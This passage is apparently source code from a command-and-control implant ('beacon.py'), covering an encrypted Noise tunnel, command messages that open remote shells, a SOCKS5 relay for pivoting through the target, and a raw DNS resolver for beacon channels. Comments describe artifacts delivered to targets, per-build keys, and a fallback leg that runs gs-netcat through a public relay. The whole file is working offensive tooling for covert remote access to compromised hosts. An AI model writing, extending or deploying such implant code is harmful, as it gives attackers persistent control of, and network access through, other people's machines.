    def handshake_hash(self) -> bytes:
        return self._h

    def mix_hash(self, data: bytes) -> None:
        self._h = hashlib.sha256(self._h + data).digest()

    def mix_key(self, input_material: bytes) -> None:
        self._ck, temp_key = _hkdf(self._ck, input_material, 2)
        self._cipher = _CipherState(temp_key)

    def mix_key_and_hash(self, input_material: bytes) -> None:
        self._ck, temp_h, temp_key = _hkdf(self._ck, input_material, 3)
        self.mix_hash(temp_h)
        self._cipher = _CipherState(temp_key)

    # `psk` is the first token of the first message in psk0, so a cipher
    # state always exists before either of these is reached. Noise's
    # "return the plaintext unchanged when there is no key" case cannot
    # arise in this pattern and is deliberately not implemented: a
    # cleartext payload must never be a reachable outcome here.

    def encrypt_and_hash(self, plaintext: bytes) -> bytes:
        ciphertext = self._cipher.encrypt_with_ad(self._h, plaintext)
        self.mix_hash(ciphertext)
        return ciphertext

    def decrypt_and_hash(self, ciphertext: bytes) -> bytes:
        plaintext = self._cipher.decrypt_with_ad(self._h, ciphertext)
        self.mix_hash(ciphertext)
        return plaintext

    def split(self) -> Tuple[_CipherState, _CipherState]:
        first, second = _hkdf(self._ck, b"", 2)
        return _CipherState(first), _CipherState(second)


class NoiseSession:
    """One side of one `Noise_NKpsk0_25519_AESGCM_SHA256` connection.

    Built through `initiator()` or `responder()`, then driven in order:

        initiator                         responder
        ---------                         ---------
        message_one = initiate(payload)
                              -------->   payload = respond(message_one)
        complete(message_two) <--------    message_two = reply()
        encrypt() / decrypt()              encrypt() / decrypt()

    `respond` hands back the first message's payload because that payload
    is how the responder learns what kind of connection this is; it is
    authenticated before it is returned, so a caller may dispatch on it.
    `reply` exists because something has to produce message 2, and the
    responder cannot produce it until it has read message 1.

    `encrypt` returns the bare Noise message. The `>H` length prefix is
    the framing layer's, not this one's.

    A call in the wrong order raises RuntimeError; a peer that fails to
    authenticate, or a message that is malformed or tampered with, raises
    ValueError. The two are kept distinct on purpose: the tunnel server
    catches ValueError to mean "this peer is not ours, say nothing and
    close", and must not swallow its own sequencing bugs with it.
    """

    PROTOCOL_NAME = b"Noise_NKpsk0_25519_AESGCM_SHA256"
    # Noise's own cap, and the one the `>H` length prefix above this can
    # express. The tag is inside it, so the plaintext ceiling is 65519.
    MAX_MESSAGE_LEN = 65535
    MAX_PAYLOAD_LEN = MAX_MESSAGE_LEN - GCM_TAG_LEN

    def __init__(self, is_initiator: bool,
                 static_public: Optional[bytes] = None,
                 static_private: Optional[bytes] = None,
                 psk: Optional[bytes] = None,
                 psk_lookup: Optional[Callable[[], Iterable[bytes]]] = None,
                 prologue: bytes = b""):
        self._is_initiator = bool(is_initiator)
        self._prologue = prologue
        self._psk_lookup = psk_lookup
        self._stage = _NOISE_START
        self._e_private = None
        self._e_public = None
        self._re = None
        self._send = None
        self._recv = None
        # The PSK that authenticates this connection. Known from the start
        # on the initiator, and only after `respond` on the responder,
        # which has to find out which of several it is -- the caller reads
        # it back to map the connection to the build it belongs to.
        self.psk = None
        # Noise's GetHandshakeHash, available once the handshake is done.
        self.handshake_hash = None
        if self._is_initiator:
            self._static_private = None
            self._static_public = _noise_32_bytes(
                static_public, "Noise responder static public key")
            self.psk = _noise_32_bytes(psk, "Noise pre-shared key")
        else:
            self._static_private = _noise_32_bytes(
                static_private, "Noise responder static private key")
            # NK's pre-message is the responder's static public key, which
            # the responder therefore has to derive from its own private
            # one rather than being handed both.
            self._static_public = _x25519(self._static_private,
                                          _X25519_BASEPOINT)
        self._sym = self._initial_symmetric()

    @classmethod
    def initiator(cls, server_public: bytes, psk: bytes,
                  prologue: bytes = b"") -> "NoiseSession":
        """The implant's side: the server's static public key and one PSK,
        both baked into the build.

        `prologue` is empty in this deployment. It is a parameter because
        the published Noise test vectors specify a non-empty one, and
        replaying those vectors is the only check on this implementation
        that does not come from this implementation.
        """
        return cls(True, static_public=server_public, psk=psk,
                   prologue=prologue)

    @classmethod
    def responder(cls, static_private: bytes,
                  psk_lookup: Callable[[], Iterable[bytes]],
                  prologue: bytes = b"") -> "NoiseSession":
        """The server's side: its static private key, and a callable that
        returns the PSKs it is willing to accept.

        A lookup rather than one key because a deployment holds one PSK
        per build and cannot know which build a connection belongs to
        until the connection authenticates. It is called once per
        handshake, and the list it returns is the whole bound on the work
        an unauthenticated peer can cause.
        """
        return cls(False, static_private=static_private,
                   psk_lookup=psk_lookup, prologue=prologue)

    # ── The handshake ──

    def initiate(self, payload: bytes = b"") -> bytes:
        """Message 1, `psk, e, es`, carrying `payload`."""
        self._require(True, _NOISE_START, "initiate")
        self._check_payload_fits(payload, _NOISE_KEY_LEN)
        sym = self._sym
        sym.mix_key_and_hash(self.psk)
        public = self._ephemeral_public()
        sym.mix_hash(public)
        # Noise §9: in a PSK handshake the ephemeral is mixed into the
        # chaining key as well as the hash. That is what makes two first
        # messages with the same PSK and the same payload differ in every
        # byte rather than only in the ephemeral.
        sym.mix_key(public)
        sym.mix_key(_x25519(self._e_private, self._static_public))
        message = public + sym.encrypt_and_hash(payload)
        self._stage = _NOISE_SENT_MESSAGE_ONE
        return message

    def respond(self, message: bytes) -> bytes:
        """Read message 1 and return its payload, authenticated.

        Each PSK the lookup offers is tried until one authenticates the
        message. Every failure is a GCM tag failure and nothing else: the
        work per candidate is two HKDFs and one tag check, and the one
        Diffie-Hellman the message needs does not depend on the PSK, so it
        is done once. A candidate that is not 32 bytes raises rather than
        being skipped -- a malformed key in the store is a configuration
        fault, and silently excluding it would turn it into a build that
        mysteriously cannot connect.
        """
        self._require(False, _NOISE_START, "respond")
        self._check_message_length(message, "message 1")
        remote_ephemeral = bytes(message[:_NOISE_KEY_LEN])
        ciphertext = bytes(message[_NOISE_KEY_LEN:])
        # From here the session is spent whatever happens: a peer gets one
        # attempt, and a failure leaves nothing a caller could retry on.
        self._stage = _NOISE_FAILED
        candidates = [_noise_32_bytes(psk, "Noise pre-shared key")
                      for psk in self._psk_lookup()]
        if not candidates:
            raise ValueError(
                "no pre-shared keys to try: a responder with no registered "
                "build cannot authenticate anybody")
        shared = _x25519(self._static_private, remote_ephemeral)
        for psk in candidates:
            sym = self._initial_symmetric()
            sym.mix_key_and_hash(psk)
            sym.mix_hash(remote_ephemeral)
            sym.mix_key(remote_ephemeral)
            sym.mix_key(shared)
            try:
                payload = sym.decrypt_and_hash(ciphertext)
            except ValueError:
                continue
            self._sym = sym
            self._re = remote_ephemeral
            self.psk = psk
            self._stage = _NOISE_READ_MESSAGE_ONE
            return payload
        raise ValueError(
            "Noise message 1 did not authenticate under any of the %d "
            "pre-shared keys offered" % len(candidates))

    def reply(self, payload: bytes = b"") -> bytes:
        """Message 2, `e, ee`, carrying `payload`. Completes this side."""
        self._require(False, _NOISE_READ_MESSAGE_ONE, "reply")
        self._check_payload_fits(payload, _NOISE_KEY_LEN)
        sym = self._sym
        public = self._ephemeral_public()
        sym.mix_hash(public)
        sym.mix_key(public)
        sym.mix_key(_x25519(self._e_private, self._re))
        message = public + sym.encrypt_and_hash(payload)
        self._split()
        return message

    def complete(self, message: bytes) -> None:
        """Read message 2 and move to transport.

        The pattern allows message 2 a payload, which this API has no use
        for: it is authenticated, mixed into the handshake hash, and
        dropped. Nothing downstream may read an unauthenticated byte, so
        there is no path that returns it un-checked.
        """
        self._require(True, _NOISE_SENT_MESSAGE_ONE, "complete")
        self._check_message_length(message, "message 2")
        remote_ephemeral = bytes(message[:_NOISE_KEY_LEN])
        self._stage = _NOISE_FAILED
        sym = self._sym
        sym.mix_hash(remote_ephemeral)
        sym.mix_key(remote_ephemeral)
        sym.mix_key(_x25519(self._e_private, remote_ephemeral))
        sym.decrypt_and_hash(bytes(message[_NOISE_KEY_LEN:]))
        self._split()

    # ── Transport ──

    def encrypt(self, plaintext: bytes) -> bytes:
        """One transport message, unframed."""
        self._require(None, _NOISE_TRANSPORT, "encrypt")
        self._check_payload_fits(plaintext, 0)
        return self._send.encrypt_with_ad(b"", plaintext)

    def decrypt(self, ciphertext: bytes) -> bytes:
        """The plaintext of one transport message, or a ValueError.

        A frame that is tampered with, truncated, replayed or arrives out
        of order all fail here, because the counter is the only sequence
        number the protocol has.
        """
        self._require(None, _NOISE_TRANSPORT, "decrypt")
        if len(ciphertext) > self.MAX_MESSAGE_LEN:
            raise ValueError(
                "transport message is %d bytes; a Noise message is at most "
                "%d" % (len(ciphertext), self.MAX_MESSAGE_LEN))
        return self._recv.decrypt_with_ad(b"", ciphertext)

    # ── Internals ──

    def _initial_symmetric(self) -> _SymmetricState:
        """A SymmetricState with the prologue and the pre-message mixed in.

        Rebuilt rather than copied for each PSK the responder tries: it is
        two SHA-256 calls, where a copy would have to be deep to be safe.
        """
        sym = _SymmetricState(self.PROTOCOL_NAME)
        sym.mix_hash(self._prologue)
        # NK's pre-message, `<- s`. Both ends mix it before the first
        # message, so an initiator aimed at the wrong server fails on the
        # first tag rather than somewhere later and less legibly.
        sym.mix_hash(self._static_public)
        return sym

    def _ephemeral_public(self) -> bytes:
        if self._e_private is None:
            self._e_private, self._e_public = _x25519_keypair()
        return self._e_public

    def _fix_ephemeral(self, private: bytes) -> None:
        """Pin the ephemeral keypair instead of generating one.

        A test seam, and the only way to replay a published test vector,
        which specifies both ephemerals. Production must never call it: an
        ephemeral reused across two handshakes reuses the transport keys
        with it.
        """
        if self._stage != _NOISE_START:
            raise RuntimeError("the ephemeral key is already in use")
        self._e_private = _noise_32_bytes(private,
                                          "Noise ephemeral private key")
        self._e_public = _x25519(self._e_private, _X25519_BASEPOINT)

    def _split(self) -> None:
        first, second = self._sym.split()
        # Noise §5.3: the initiator sends under the first key and receives
        # under the second; the responder has them the other way round.
        if self._is_initiator:
            self._send, self._recv = first, second
        else:
            self._send, self._recv = second, first
        self.handshake_hash = self._sym.handshake_hash()
        self._stage = _NOISE_TRANSPORT

    def _role(self) -> str:
        return "initiator" if self._is_initiator else "responder"

    def _require(self, is_initiator, stage: str, call: str) -> None:
        """Refuse a call this session is not at. `is_initiator` None means
        either role may make it.
        """
        if is_initiator is not None and bool(is_initiator) != self._is_initiator:
            raise RuntimeError(
                "%s() is the %s's call and this session is the %s"
                % (call, "initiator" if is_initiator else "responder",
                   self._role()))
        if self._stage != stage:
            raise RuntimeError(
                "%s() cannot run now: this %s session is at %r, not %r"
                % (call, self._role(), self._stage, stage))

    def _check_payload_fits(self, payload: bytes, overhead: int) -> None:
        limit = self.MAX_PAYLOAD_LEN - overhead
        if len(payload) > limit:
            raise ValueError(
                "payload is %d bytes; at most %d fits here, because the "
                "message and its %d-byte tag together must not exceed %d"
                % (len(payload), limit, GCM_TAG_LEN, self.MAX_MESSAGE_LEN))

    def _check_message_length(self, message: bytes, what: str) -> None:
        shortest = _NOISE_KEY_LEN + GCM_TAG_LEN
        if len(message) < shortest:
            raise ValueError(
                "Noise %s is %d bytes; the shortest valid one is %d, being "
                "a %d-byte ephemeral key, an empty payload and a %d-byte "
                "tag" % (what, len(message), shortest, _NOISE_KEY_LEN,
                         GCM_TAG_LEN))
        if len(message) > self.MAX_MESSAGE_LEN:
            raise ValueError(
                "Noise %s is %d bytes; a Noise message is at most %d"
                % (what, len(message), self.MAX_MESSAGE_LEN))


# ── Tunnel wire format: framing, command messages and SOCKS5 ──

# The wire, outermost first:
#
#   frame           = ">H" length + one Noise message
#   command message = kind(1) + compact JSON object        (inside Noise)
#   SOCKS request   = ver(1)=5 cmd(1) rsv(1)=0 atyp(1) addr port(">H")
#   SOCKS reply     = ver(1)=5 rep(1) rsv(1)=0 atyp(1) addr port(">H")
#
# Every number here is big-endian and every reserved field is present and
# checked, per RFC 1928. Both choices are deliberate and neither is free,
# so the reasons are written down -- in
# `software/c2/tunnel/protocol.py` and in docs/TUNNEL.md, and not here.
# This file is read verbatim into every delivered artifact, so a comment
# in it is a comment on the host, and the only comments worth putting on
# a host are the ones a maintainer of *this* code needs. An empty frame,
# which is the bytes `00 00` exactly, is refused by both `write_frame`
# and `read_frame` for a reason recorded in the same two places.
#
# This section lives in `beacon.py` because `api_beacon_gen` reads exactly
# this one file to build the artifact the tunnel endpoint runs from. A
# helper in another module would pass every test here and be absent on
# target. `software/c2/tunnel/protocol.py` re-exports these names for the
# server side; it holds no second copy.
#
# The SOCKS greeting and the RFC 1929 username/password sub-negotiation
# are deliberately absent. Only the operator-facing side performs those,
# and that side is never delivered to a target, so neither belongs in this
# file.

# The frame length prefix and the SOCKS port, which are the two numbers a
# reader will check the byte order of. One struct for both, because they
# are one decision.
_BE_UINT16 = struct.Struct(">H")

FRAME_PREFIX_LEN = _BE_UINT16.size

# A frame carries one Noise message, so its ceiling is Noise's own -- and
# that is exactly what a `>H` prefix can express, so a frame that fits the
# prefix always fits the cipher and there is no third limit to keep in step.
MAX_FRAME_LEN = NoiseSession.MAX_MESSAGE_LEN

# The plaintext ceiling, a frame's worth less the GCM tag. Aliased from the
# session rather than written as a number again: two names for 65519 is one
# too many, and the second would be the one that goes stale.
MAX_PAYLOAD_LEN = NoiseSession.MAX_PAYLOAD_LEN


def write_frame(sock: socket.socket, payload: bytes) -> None:
    """Write one length-prefixed frame, or refuse before touching `sock`.

    Both refusals happen before any byte goes out, because a prefix on the
    wire with nothing behind it leaves the peer unable to read the stream
    ever again and there is no way to take it back. That is also why the
    prefix and the body go in one `sendall` rather than two: one call
    cannot leave a prefix written and a body unwritten by returning
    between them.

    It is **not** a claim that a frame is atomic against another thread.
    `sendall` loops over partial sends and releases the GIL in each of
    them, so two threads writing one socket could still interleave. That
    is sound here because every socket in this protocol has exactly one
    writer -- the command channel's `send` holds a lock, and a relay
    stream holds one that also orders the nonce -- and a future caller
    that wants a second writer has to bring its own lock rather than read
    one into this function.
    """
    if not payload:
        raise ValueError(
            "an empty frame is the two bytes 00 00 on the wire; this "
            "protocol never sends one")
    if len(payload) > MAX_FRAME_LEN:
        raise ValueError(
            "frame payload is %d bytes; a `>H` prefix tops out at %d"
            % (len(payload), MAX_FRAME_LEN))
    sock.sendall(_BE_UINT16.pack(len(payload)) + payload)


def read_frame(sock: socket.socket) -> bytes:
    """One whole frame's payload, or a ValueError.

    A peer that closes mid-frame raises, and so does one that stalls past
    the socket's own timeout -- the caller sets that, because how long to
    wait is the caller's policy and not this function's. What never
    happens is a short read returned as though it were a whole frame.
    """
    prefix = _read_exactly(sock, FRAME_PREFIX_LEN, "frame length prefix")
    (length,) = _BE_UINT16.unpack(prefix)
    if length == 0:
        raise ValueError(
            "a frame of length 0 is the two bytes 00 00; this protocol "
            "neither sends nor accepts one")
    return _read_exactly(sock, length, "frame body")


def _read_exactly(sock: socket.socket, count: int, what: str) -> bytes:
    """Exactly `count` bytes, or a ValueError naming how far it got."""
    chunks = []
    have = 0
    while have < count:
        chunk = sock.recv(count - have)
        if not chunk:
            raise ValueError(
                "the peer closed after %d of %d bytes of the %s"
                % (have, count, what))
        chunks.append(chunk)
        have += len(chunk)
    return b"".join(chunks)


# ── Command messages ──

MSG_HELLO = 1
MSG_RELAY = 2
MSG_OPEN_RELAY = 3
MSG_PING = 4
MSG_PONG = 5
MSG_CLOSE = 6
MSG_OPEN_SHELL = 7
MSG_SHELL = 8

MESSAGE_KIND_NAMES = {
    MSG_HELLO: "HELLO",
    MSG_RELAY: "RELAY",
    MSG_OPEN_RELAY: "OPEN_RELAY",
    MSG_PING: "PING",
    MSG_PONG: "PONG",
    MSG_CLOSE: "CLOSE",
    MSG_OPEN_SHELL: "OPEN_SHELL",
    MSG_SHELL: "SHELL",
}

MESSAGE_KINDS = tuple(sorted(MESSAGE_KIND_NAMES))

# What an endpoint of this build can do beyond the relay, as HELLO lists it.
# The server sends a feature's messages only to an endpoint that named it,
# because a build that predates one ends its control loop on meeting a kind
# it does not know.
TUNNEL_FEATURES = ("shell",)

# The terminal a shell session opens with when the operator names none, and
# the largest either end accepts. Both ends clamp against these -- the
# endpoint before its ioctl, the front before it asks for a session -- so
# they live here with the codec and not in either of them.
SHELL_DEFAULT_COLS = 120
SHELL_DEFAULT_ROWS = 40
SHELL_GEOMETRY_MAX = 1000


def _code_list(table: dict) -> str:
    """`1 (HELLO), 2 (RELAY)` -- what an error says it expected instead.

    Built from the table rather than written out, so a renumbering cannot
    leave an error message describing the protocol as it used to be.
    """
    return ", ".join("%d (%s)" % (code, table[code])
                     for code in sorted(table))


def encode_message(kind: int, body: dict) -> bytes:
    """One command message: a kind byte and a compact JSON object.

    JSON rather than a packed struct because this channel carries a handful
    of messages an hour, so being able to read a capture of our own test
    rig is worth more than the bytes. Keys are sorted, so the same body
    always encodes to the same bytes and two captures diff cleanly.
    """
    if kind not in MESSAGE_KIND_NAMES:
        raise ValueError("message kind %r is not one of %s"
                         % (kind, _code_list(MESSAGE_KIND_NAMES)))
    if not isinstance(body, dict):
        raise ValueError("a message body is a JSON object, not %s"
                         % type(body).__name__)
    try:
        text = json.dumps(body, separators=(",", ":"), sort_keys=True)
    except (TypeError, ValueError):
        text = None
    # Raised outside the except block, and without the body in it: a body
    # holds a session token and a hostname, and neither belongs in a log.
    if text is None:
        raise ValueError("a %s body must be JSON-serialisable with string "
                         "keys" % MESSAGE_KIND_NAMES[kind])
    raw = bytes([kind]) + text.encode("utf-8")
    if len(raw) > MAX_PAYLOAD_LEN:
        raise ValueError(
            "a %s message encodes to %d bytes; at most %d fits in one "
            "Noise message" % (MESSAGE_KIND_NAMES[kind], len(raw),
                               MAX_PAYLOAD_LEN))
    return raw


def decode_message(raw: bytes) -> Tuple[int, dict]:
    """The kind and body of one command message, or a ValueError."""
    data = bytes(raw)
    if not data:
        raise ValueError("a command message is at least a kind byte")
    kind = data[0]
    if kind not in MESSAGE_KIND_NAMES:
        raise ValueError("message kind %d is not one of %s"
                         % (kind, _code_list(MESSAGE_KIND_NAMES)))
    try:
        # json.JSONDecodeError and UnicodeDecodeError are both ValueErrors.
        body = json.loads(data[1:].decode("utf-8"))
    except ValueError:
        body = None
    if not isinstance(body, dict):
        raise ValueError("the body of a %s message is not a JSON object"
                         % MESSAGE_KIND_NAMES[kind])
    return kind, body


# ── SOCKS5 requests and replies, RFC 1928 §4 and §6 ──

SOCKS_VERSION = 5

# RFC 1928 reserves byte 3 of both messages and fixes it at zero, so a
# non-zero one here is a malformed message.
_SOCKS_RESERVED = 0

# ver | cmd-or-rep | rsv | atyp, before the address.
_SOCKS_HEADER_LEN = 4

CMD_CONNECT = 1
CMD_BIND = 2
CMD_UDP_ASSOCIATE = 3

SOCKS_COMMAND_NAMES = {
    CMD_CONNECT: "CONNECT",
    CMD_BIND: "BIND",
    CMD_UDP_ASSOCIATE: "UDP ASSOCIATE",
}

# Only CONNECT is answered. The other two still decode, because a peer that
# asks for one has to be refused with REPLY_COMMAND_NOT_SUPPORTED, and a
# refusal cannot be sent for a request that never parsed -- a parse error
# is indistinguishable, from the far end, from a tunnel that has died.
SUPPORTED_COMMANDS = (CMD_CONNECT,)

ATYP_IPV4 = 1
ATYP_DOMAIN = 3
ATYP_IPV6 = 4

SOCKS_ADDRESS_TYPE_NAMES = {
    ATYP_IPV4: "IPv4",
    ATYP_DOMAIN: "domain name",
    ATYP_IPV6: "IPv6",
}

REPLY_SUCCEEDED = 0
REPLY_GENERAL_FAILURE = 1
REPLY_NOT_ALLOWED = 2
REPLY_NETWORK_UNREACHABLE = 3
REPLY_HOST_UNREACHABLE = 4
REPLY_CONNECTION_REFUSED = 5
REPLY_TTL_EXPIRED = 6
REPLY_COMMAND_NOT_SUPPORTED = 7
REPLY_ADDRESS_TYPE_NOT_SUPPORTED = 8

SOCKS_REPLY_NAMES = {
    REPLY_SUCCEEDED: "succeeded",
    REPLY_GENERAL_FAILURE: "general SOCKS server failure",
    REPLY_NOT_ALLOWED: "connection not allowed by ruleset",
    REPLY_NETWORK_UNREACHABLE: "network unreachable",
    REPLY_HOST_UNREACHABLE: "host unreachable",
    REPLY_CONNECTION_REFUSED: "connection refused",
    REPLY_TTL_EXPIRED: "TTL expired",
    REPLY_COMMAND_NOT_SUPPORTED: "command not supported",
    REPLY_ADDRESS_TYPE_NOT_SUPPORTED: "address type not supported",
}


def socks_command_supported(cmd: int) -> bool:
    """Whether this end answers `cmd` rather than refusing it.

    Separate from `decode_socks_request` on purpose, so that a BIND or UDP
    ASSOCIATE request decodes and the caller can answer it with
    REPLY_COMMAND_NOT_SUPPORTED.
    """
    return cmd in SUPPORTED_COMMANDS


def encode_socks_request(cmd: int, atyp: int, address: str,
                         port: int) -> bytes:
    """One SOCKS5 request, RFC 1928 §4.

    `atyp` is passed rather than inferred from `address`: the operator-side
    proxy relays what its client asked for, and a client that sends ATYP=3
    with something that happens to look like an IP literal must still be
    relayed as a name.
    """
    if cmd not in SOCKS_COMMAND_NAMES:
        raise ValueError("SOCKS command %r is not one of %s"
                         % (cmd, _code_list(SOCKS_COMMAND_NAMES)))
    return _encode_socks_envelope(cmd, atyp, address, port)


def decode_socks_request(raw: bytes) -> Tuple[int, int, str, int]:
    """`(cmd, atyp, address, port)` from one whole SOCKS5 request.

    `raw` must be exactly one request and nothing else: on this protocol a
    request arrives as its own frame, so trailing bytes are a malformed
    message rather than the beginning of the relayed stream. A reader
    pulling requests out of a raw TCP stream has to delimit them itself.
    """
    cmd, atyp, address, port = _decode_socks_envelope(raw, "request")
    if cmd not in SOCKS_COMMAND_NAMES:
        raise ValueError("SOCKS command %d is not one of %s"
                         % (cmd, _code_list(SOCKS_COMMAND_NAMES)))
    return cmd, atyp, address, port


def encode_socks_reply(reply: int, atyp: int = ATYP_IPV4,
                       address: str = "0.0.0.0", port: int = 0) -> bytes:
    """One SOCKS5 reply, RFC 1928 §6, where `REPLY_SUCCEEDED` is 0.

    The bound address defaults to `0.0.0.0:0` because RFC 1928 leaves
    BND.ADDR and BND.PORT meaningless when the reply is not a success, and
    every refusal path would otherwise have to invent one.
    """
    if reply not in SOCKS_REPLY_NAMES:
        raise ValueError("SOCKS reply code %r is not one of %s"
                         % (reply, _code_list(SOCKS_REPLY_NAMES)))
    return _encode_socks_envelope(reply, atyp, address, port)


def decode_socks_reply(raw: bytes) -> Tuple[int, int, str, int]:
    """`(reply, atyp, address, port)` from one whole SOCKS5 reply."""
    reply, atyp, address, port = _decode_socks_envelope(raw, "reply")
    if reply not in SOCKS_REPLY_NAMES:
        raise ValueError("SOCKS reply code %d is not one of %s"
                         % (reply, _code_list(SOCKS_REPLY_NAMES)))
    return reply, atyp, address, port


def _encode_socks_envelope(code: int, atyp: int, address: str,
                           port: int) -> bytes:
    """`ver | code | rsv | atyp | addr | port`, where `code` is the CMD of
    a request or the REP of a reply.

    Shared because those two messages differ in nothing else, and a layout
    written down twice is a layout that gets corrected once.
    """
    if not isinstance(address, str):
        raise ValueError("a SOCKS address is text, not %s"
                         % type(address).__name__)
    if not isinstance(port, int) or not 0 <= port <= 0xFFFF:
        raise ValueError("port %r is not a uint16" % (port,))
    return (bytes([SOCKS_VERSION, code, _SOCKS_RESERVED, atyp])
            + _encode_socks_address(atyp, address)
            + _BE_UINT16.pack(port))


def _decode_socks_envelope(raw: bytes,
                           what: str) -> Tuple[int, int, str, int]:
    data = bytes(raw)
    if len(data) < _SOCKS_HEADER_LEN:
        raise ValueError(
            "a SOCKS %s opens with %d bytes of header; this one is %d "
            "bytes long in total" % (what, _SOCKS_HEADER_LEN, len(data)))
    if data[0] != SOCKS_VERSION:
        raise ValueError(
            "a SOCKS %s opens with version %d; this one says %d"
            % (what, SOCKS_VERSION, data[0]))
    if data[2] != _SOCKS_RESERVED:
        raise ValueError(
            "RFC 1928 reserves byte 3 of a %s and fixes it at 0x%02x; this "
            "one is 0x%02x" % (what, _SOCKS_RESERVED, data[2]))
    atyp = data[3]
    address, used = _decode_socks_address(data[_SOCKS_HEADER_LEN:], atyp,
                                          what)
    expected = _SOCKS_HEADER_LEN + used + _BE_UINT16.size
    if len(data) != expected:
        raise ValueError(
            "a SOCKS %s with this address is %d bytes; this one is %d"
            % (what, expected, len(data)))
    (port,) = _BE_UINT16.unpack(data[expected - _BE_UINT16.size:])
    # Byte 1 is the CMD of a request and the REP of a reply; which one it
    # is, and whether this end knows that value, is the caller's to say.
    return data[1], atyp, address, port


def _encode_socks_address(atyp: int, address: str) -> bytes:
    if atyp == ATYP_IPV4:
        return _pack_socks_ip(socket.AF_INET, address, "an IPv4 address")
    if atyp == ATYP_IPV6:
        return _pack_socks_ip(socket.AF_INET6, address, "an IPv6 address")
    if atyp == ATYP_DOMAIN:
        name = address.encode("utf-8")
        if not name:
            raise ValueError("a SOCKS domain name cannot be empty")
        if len(name) > 0xFF:
            raise ValueError(
                "a SOCKS domain name is %d bytes and its length byte tops "
                "out at %d" % (len(name), 0xFF))
        return bytes([len(name)]) + name
    raise ValueError("SOCKS address type %r is not one of %s"
                     % (atyp, _code_list(SOCKS_ADDRESS_TYPE_NAMES)))


def _pack_socks_ip(family: int, address: str, what: str) -> bytes:
    try:
        packed = socket.inet_pton(family, address)
    except (OSError, ValueError):
        packed = None
    if packed is None:
        raise ValueError("%r is not %s" % (address, what))
    return packed


def _decode_socks_address(tail: bytes, atyp: int,
                          what: str) -> Tuple[str, int]:
    """The address in `tail`, and how many of its bytes it took."""
    if atyp == ATYP_IPV4:
        return _unpack_socks_ip(socket.AF_INET, tail, 4, what), 4
    if atyp == ATYP_IPV6:
        return _unpack_socks_ip(socket.AF_INET6, tail, 16, what), 16
    if atyp == ATYP_DOMAIN:
        if not tail:
            raise ValueError("a SOCKS %s with ATYP=3 carries no length byte"
                             % what)
        length = tail[0]
        if length == 0:
            raise ValueError("a SOCKS %s carries an empty domain name"
                             % what)
        if len(tail) < 1 + length:
            raise ValueError(
                "a SOCKS %s promises a %d-byte domain name and carries %d "
                "bytes of it" % (what, length, len(tail) - 1))
        try:
            name = tail[1:1 + length].decode("utf-8")
        except ValueError:
            name = None
        # Refused rather than mangled with a replacement character: a name
        # we cannot read is a name we must not silently resolve.
        if name is None:
            raise ValueError("the domain name in a SOCKS %s is not UTF-8"
                             % what)
        return name, 1 + length
    raise ValueError("SOCKS address type %d is not one of %s"
                     % (atyp, _code_list(SOCKS_ADDRESS_TYPE_NAMES)))


def _unpack_socks_ip(family: int, tail: bytes, size: int,
                     what: str) -> str:
    if len(tail) < size:
        raise ValueError(
            "a SOCKS %s needs %d address bytes and carries %d"
            % (what, size, len(tail)))
    return socket.inet_ntop(family, tail[:size])


# ── Stdlib DNS resolver (TXT + A records) ──

# The resolver port. Named rather than written into the sendto call so a
# test can point this at a listener on a free port: binding 53 needs root,
# and in production dockerd or systemd owns it and forwards to an
# unprivileged listener, so nothing here ever binds it either.
_DNS_PORT = 53


def _dns_query(name: str, qtype: str, server: str, timeout: float = 10,
               status: Optional[dict] = None, source: str = "") -> list:
    """Minimal DNS query using raw UDP sockets. Returns list of strings (TXT) or IPs (A).

    `source` binds the query to one local address, which is what makes the
    way out's radio rung real: its route lives in a table of its own,
    selected by an `ip rule from <address>`, and that rule matches only
    packets whose source *is* that address. A locally-generated datagram
    has an unspecified source until it is bound, so without this the rule
    never matched and the rung installed a route nothing could use while
    reporting success. Empty is every address, which is what every caller
    but that rung passes.
    """
    qtypes = {"A": 1, "TXT": 16}
    qtype_num = qtypes.get(qtype.upper(), 1)

    txn_id = random.randint(0, 0xFFFF)
    flags = 0x0100  # standard query, recursion desired
    header = struct.pack("!HHHHHH", txn_id, flags, 1, 0, 0, 0)

    qname = b""
    for label in name.encode().split(b"."):
        qname += struct.pack("B", len(label)) + label
    qname += b"\x00"
    question = qname + struct.pack("!HH", qtype_num, 1)  # QCLASS=IN

    packet = header + question

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        if source:
            sock.bind((source, 0))
        sock.sendto(packet, (server, _DNS_PORT))
        data, _ = sock.recvfrom(4096)
    finally:
        sock.close()

    if len(data) < 12:
        return []

    _, resp_flags, qdcount, ancount = struct.unpack("!HHHH", data[:8])
    rcode = resp_flags & 0x0F
    # The caller may need to tell a resolver that said SERVFAIL from one
    # that answered with nothing: an empty list alone conflates them, and
    # the rescue channel's whole trigger rests on the difference.
    if status is not None:
        status["rcode"] = rcode
    if rcode != 0:
        return []

    offset = 12
    for _ in range(qdcount):
        while offset < len(data):
            length = data[offset]
            if length == 0:
                offset += 1
                break
            if (length & 0xC0) == 0xC0:
                offset += 2
                break
            offset += 1 + length
        offset += 4  # QTYPE + QCLASS

    results = []
    for _ in range(ancount):
        if offset >= len(data):
            break
        if (data[offset] & 0xC0) == 0xC0:
            offset += 2
        else:
            while offset < len(data):
                length = data[offset]
                if length == 0:
                    offset += 1
                    break
                offset += 1 + length

        if offset + 10 > len(data):
            break
        rtype, rclass, ttl, rdlength = struct.unpack("!HHIH", data[offset:offset + 10])
        offset += 10
        rdata = data[offset:offset + rdlength]
        offset += rdlength

        if rtype == 1 and len(rdata) == 4:  # A record
            results.append(f"{rdata[0]}.{rdata[1]}.{rdata[2]}.{rdata[3]}")
        elif rtype == 16:  # TXT record
            txt_offset = 0
            txt_parts = []
            while txt_offset < len(rdata):
                txt_len = rdata[txt_offset]
                txt_offset += 1
                txt_parts.append(rdata[txt_offset:txt_offset + txt_len])
                txt_offset += txt_len
            results.append(b"".join(txt_parts).decode("utf-8", errors="replace"))

    return results


# The five channels a beacon can use, and the one place the config file is
# mapped onto them. `main.py` and `beacon_standalone.py` each used to build
# this dictionary by hand, and each listed https and dns only -- so `smb`
# and `quic` in a config file never reached the beacon, and the only way
# to switch either on was to construct a Beacon in Python. Two copies of
# one mapping, both missing the same half, is how that survived.
#
# `gsocket` goes last, and the order is the order the legs are tried. It
# is the only one whose precondition is not "the team server is reachable
# at an address this implant can name": it dials the Global Socket Relay
# Network through a `gs-netcat` child and is paired with the team server
# by a shared secret. That makes it the leg to try when the four above it
# have failed, and nothing to spend a child process on before then.
